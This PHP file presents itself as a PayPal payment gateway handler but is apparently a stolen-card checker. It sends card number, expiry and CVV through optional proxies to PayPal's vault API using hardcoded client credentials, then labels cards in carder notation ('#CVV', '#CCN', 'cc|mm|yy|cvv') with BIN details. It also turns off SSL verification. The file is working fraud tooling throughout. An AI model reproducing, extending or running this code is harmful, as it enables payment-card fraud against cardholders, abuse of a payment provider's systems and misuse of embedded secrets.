<?php
/**
 * PayPal Gateway Handler
 * Validates cards against PayPal's payment processing system
 */

// Check a card with PayPal gateway
function checkCardWithPaypal($cc, $mes, $ano, $cvv, $bin_data, $user_data, $session_data, $apiKey, $secretKey, $proxyConfig) {
    // Start timing
    $start_time = microtime(true);
    
    // Format month for PayPal (requires 2 digits)
    $mes = str_pad($mes, 2, '0', STR_PAD_LEFT);
    
    // Initialize cURL
    $ch = curl_init();
    
    // Set proxy if configured
    if (!empty($proxyConfig)) {
        configureCurlWithProxy($ch, $proxyConfig);
    }
    
    // Common cURL options
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    
    // Set client ID and secret
    $client_id = !empty($apiKey) ? $apiKey : 'AZDxjDScFpQtjWTOUtWKbyN_bDt4OgqaF4eYXlewfBP4-8aqX3PiV8e1GWU6liB2CUXlkA59kJXE7M6R';
    $client_secret = !empty($secretKey) ? $secretKey : 'EL1tVxAjhT7cJimnz5-Nsx9k2reTKSVfErNQF-CmrwJgxRtylkGTKlU4RvrX_0eIk7FEV0YNXWNBIgud';
    
    // First request - Get access token
    curl_setopt($ch, CURLOPT_URL, "https://api.paypal.com/v1/oauth2/token");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Accept: application/json",
        "Accept-Language: en_US",
        "Content-Type: application/x-www-form-urlencoded",
    ]);
    curl_setopt($ch, CURLOPT_USERPWD, $client_id . ":" . $client_secret);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "grant_type=client_credentials");
    
    $result1 = curl_exec($ch);
    
    // Check for successful first request
    if (!$result1 || curl_errno($ch)) {
        $time_taken = number_format(microtime(true) - $start_time, 2);
        return "❌ ERROR: PayPal connection failed | Time: " . $time_taken . "s";
    }
    
    $token_data = json_decode($result1, true);
    
    if (!isset($token_data['access_token'])) {
        $time_taken = number_format(microtime(true) - $start_time, 2);
        return "❌ ERROR: Failed to get PayPal access token | Time: " . $time_taken . "s";
    }
    
    $token = $token_data['access_token'];
    
    // Second request - Validate the card
    curl_setopt($ch, CURLOPT_URL, "https://api.paypal.com/v1/vault/credit-cards");
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Content-Type: application/json",
        "Authorization: Bearer " . $token,
    ]);
    
    // Prepare card data
    $card_data = [
        'number' => $cc,
        'type' => detectCardType($cc),
        'expire_month' => $mes,
        'expire_year' => $ano,
        'cvv2' => $cvv,
        'first_name' => $user_data['first_name'],
        'last_name' => $user_data['last_name'],
        'billing_address' => [
            'line1' => $user_data['street'],
            'city' => $user_data['city'],
            'state' => $user_data['state'],
            'postal_code' => $user_data['postcode'],
            'country_code' => 'US'
        ]
    ];
    
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($card_data));
    
    $result2 = curl_exec($ch);
    curl_close($ch);
    
    // Calculate time taken
    $time_taken = number_format(microtime(true) - $start_time, 2);
    
    // Format bin info for display
    $bin_info_formatted = formatBinInfo($bin_data);
    
    // Process result
    if ($result2) {
        $response = json_decode($result2, true);
        
        if (isset($response['id'])) {
            // Card was accepted and tokenized
            return "✅ #CVV - $cc|$mes|$ano|$cvv - [ PayPal Approved | $bin_info_formatted | Time: " . $time_taken . "s ]";
        } elseif (isset($response['name']) && $response['name'] === 'INVALID_RESOURCE_ID') {
            // Usually means incorrect card details
            return "❌ DECLINED - $cc|$mes|$ano|$cvv - [ Invalid Card | $bin_info_formatted | Time: " . $time_taken . "s ]";
        } elseif (isset($response['details']) && is_array($response['details'])) {
            // Detailed error information
            $error_info = '';
            foreach ($response['details'] as $detail) {
                if (isset($detail['issue'])) {
                    $error_info .= $detail['issue'] . ' ';
                }
            }
            
            if (strpos(strtolower($error_info), 'cvv') !== false) {
                return "⚠️ #CCN - $cc|$mes|$ano|$cvv - [ Invalid CVV | $bin_info_formatted | Time: " . $time_taken . "s ]";
            } else {
                return "❌ DECLINED - $cc|$mes|$ano|$cvv - [ $error_info | $bin_info_formatted | Time: " . $time_taken . "s ]";
            }
        } else {
            // Generic error
            $error_msg = isset($response['message']) ? $response['message'] : 'Unknown Error';
            return "❌ DECLINED - $cc|$mes|$ano|$cvv - [ $error_msg | $bin_info_formatted | Time: " . $time_taken . "s ]";
        }
    } else {
        return "❌ ERROR - $cc|$mes|$ano|$cvv - [ PayPal Connection Error | Time: " . $time_taken . "s ]";
    }
}

// Detect card type based on first digits
function detectCardType($cc) {
    $firstDigit = substr($cc, 0, 1);
    $firstTwo = substr($cc, 0, 2);
    $firstFour = substr($cc, 0, 4);
    $firstSix = substr($cc, 0, 6);
    
    if ($firstDigit == '4') {
        return 'visa';
    } elseif ($firstTwo >= '51' && $firstTwo <= '55') {
        return 'mastercard';
    } elseif ($firstTwo == '34' || $firstTwo == '37') {
        return 'amex';
    } elseif ($firstFour == '6011' || $firstTwo == '65' || ($firstSix >= '622126' && $firstSix <= '622925')) {
        return 'discover';
    } else {
        return 'visa'; // Default to visa if unsure
    }
}
?>